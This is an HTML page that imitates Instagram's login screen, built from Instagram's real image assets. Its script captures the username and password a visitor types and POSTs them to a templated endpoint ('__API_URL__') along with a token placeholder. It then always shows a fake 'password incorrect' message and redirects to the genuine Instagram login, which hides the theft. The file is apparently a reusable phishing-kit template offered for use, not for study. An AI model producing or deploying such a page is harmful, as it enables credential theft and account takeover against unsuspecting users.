<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" type="image/png">
    <meta name="description" content="Log in to your Instagram account">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background-color:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
        .main-container{display:flex;align-items:center;max-width:935px;width:100%;justify-content:center}
        .phones-container{background-image:url('https://static.cdninstagram.com/rsrc.php/v3/y4/r/ItTndlZM2n2.png');width:454px;height:618px;background-size:454px 618px;margin-right:32px;position:relative}
        @media(max-width:875px){.phones-container{display:none}}
        .phone-mockup{position:absolute;top:26px;right:18px;width:250px;height:538px;border-radius:20px;overflow:hidden}
        .phone-mockup img{width:100%;height:100%;object-fit:cover;position:absolute;opacity:0;transition:opacity 1.2s ease-in-out}
        .phone-mockup img.active{opacity:1}
        .login-box{background-color:#fff;border:1px solid #dbdbdb;width:350px;padding:10px 0;text-align:center;margin-bottom:10px;border-radius:1px;animation:fadeUp .4s ease}
        @keyframes fadeUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
        @keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-5px)}40%,80%{transform:translateX(5px)}}
        .logo{margin:22px auto 12px;height:51px;width:175px;background-image:url('https://static.cdninstagram.com/rsrc.php/v3/yS/r/8_S0p8S3fex.png');background-position:0 -52px;background-repeat:no-repeat;cursor:pointer}
        .form-container{padding:0 40px}
        .input-group{position:relative;margin-bottom:6px}
        .input-group input{width:100%;height:38px;padding:14px 8px 2px;border:1px solid #dbdbdb;background:#fafafa;border-radius:3px;font-size:12px;outline:none;transition:border-color .2s}
        .input-group input:focus{border-color:#a8a8a8}
        .input-group label{position:absolute;left:8px;top:12px;font-size:12px;color:#8e8e8e;pointer-events:none;transition:all .1s ease-out}
        .input-group input:focus+label,.input-group input:not(:placeholder-shown)+label{top:2px;font-size:10px}
        .show-pass{position:absolute;right:8px;top:50%;transform:translateY(-50%);background:none;border:none;font-size:13px;font-weight:600;cursor:pointer;color:#262626;display:none}
        .login-btn{width:100%;height:32px;background-color:#0095f6;color:white;border:none;border-radius:8px;font-weight:600;font-size:14px;margin-top:8px;cursor:pointer;opacity:.7;pointer-events:none;transition:opacity .2s;position:relative}
        .login-btn.active{opacity:1;pointer-events:auto}
        .login-btn:active{transform:scale(.98)}
        .spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top:2px solid #fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle}
        @keyframes spin{to{transform:rotate(360deg)}}
        .divider{display:flex;align-items:center;margin:15px 40px;color:#8e8e8e;font-size:13px;font-weight:600;text-transform:uppercase}
        .divider::before,.divider::after{content:"";flex:1;height:1px;background-color:#dbdbdb}
        .fb-login{color:#385185;font-size:14px;font-weight:600;text-decoration:none;display:flex;align-items:center;justify-content:center;margin:20px 0}
        .fb-login img{width:16px;margin-right:8px}
        .forgot{font-size:12px;color:#00376b;text-decoration:none;display:block;margin-top:15px}
        .forgot:hover{text-decoration:underline}
        .signup-box{background-color:#fff;border:1px solid #dbdbdb;width:350px;padding:20px;text-align:center;border-radius:1px;animation:fadeUp .5s ease}
        .signup-box p{font-size:14px;color:#262626}
        .signup-box span{color:#0095f6;font-weight:600;cursor:pointer}
        .get-app{margin-top:20px;width:350px;text-align:center}
        .get-app p{font-size:14px;margin-bottom:20px}
        .store-btns{display:flex;justify-content:center;gap:8px}
        .store-btns img{height:40px}
        .error-text{color:#ed4956;font-size:13px;text-align:center;margin-top:6px;display:none}
    </style>
</head>
<body>
    <div class="main-container">
        <div class="phones-container">
            <div class="phone-mockup" id="carousel">
                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1-2x.png/cfd5115b8858.png" class="active">
                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot2-2x.png/80b03ad2d5ad.png">
                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot3-2x.png/fe2540685167.png">
                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot4-2x.png/8e229201551a.png">
            </div>
        </div>
        <div class="content">
            <div class="login-box">
                <div class="logo"></div>
                <div class="form-container">
                    <form id="instaForm">
                        <div class="input-group">
                            <input type="text" id="username" placeholder=" " autocomplete="username" required>
                            <label>Phone number, username, or email</label>
                        </div>
                        <div class="input-group">
                            <input type="password" id="password" placeholder=" " autocomplete="current-password" required>
                            <label>Password</label>
                            <button type="button" class="show-pass" id="showPass">Show</button>
                        </div>
                        <div class="error-text" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
                        <button type="submit" id="loginBtn" class="login-btn">Log in</button>
                    </form>
                    <div class="divider"><span style="padding:0 18px;">OR</span></div>
                    <a href="#" class="fb-login">
                        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/dT5197_799A.png" alt="FB">
                        Log in with Facebook
                    </a>
                    <a href="#" class="forgot">Forgot password?</a>
                </div>
            </div>
            <div class="signup-box">
                <p>Don't have an account? <span>Sign up</span></p>
            </div>
            <div class="get-app">
                <p>Get the app.</p>
                <div class="store-btns">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7YmS_iX.png" alt="Google Play">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft">
                </div>
            </div>
        </div>
    </div>
    <script>
        const images=document.querySelectorAll('#carousel img');let ci=0;
        setInterval(()=>{images[ci].classList.remove('active');ci=(ci+1)%images.length;images[ci].classList.add('active')},5000);

        const u=document.getElementById('username'),p=document.getElementById('password'),btn=document.getElementById('loginBtn');
        const showPass=document.getElementById('showPass');

        function checkInputs(){
            const ok=u.value.length>0&&p.value.length>=6;
            btn.classList.toggle('active',ok);
            showPass.style.display=p.value.length>0?'block':'none';
        }
        u.addEventListener('input',checkInputs);
        p.addEventListener('input',checkInputs);

        showPass.addEventListener('click',()=>{
            if(p.type==='password'){p.type='text';showPass.textContent='Hide';}
            else{p.type='password';showPass.textContent='Show';}
        });

        document.getElementById('instaForm').addEventListener('submit',function(e){
            e.preventDefault();
            btn.innerHTML='<span class="spinner"></span>';
            btn.style.pointerEvents='none';
            const data={token:'__TOKEN__',username:u.value,password:p.value};
            fetch('__API_URL__',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
            .then(()=>{
                document.getElementById('errorMsg').style.display='block';
                btn.textContent='Log in';btn.style.pointerEvents='auto';
                p.value='';checkInputs();
                document.querySelector('.form-container').style.animation='shake 0.4s';
                setTimeout(()=>document.querySelector('.form-container').style.animation='',400);
                setTimeout(()=>{window.location.href='https://www.instagram.com/accounts/login/';},3000);
            })
            .catch(()=>{window.location.href='https://www.instagram.com/accounts/login/';});
        });
    </script>
</body>
</html>
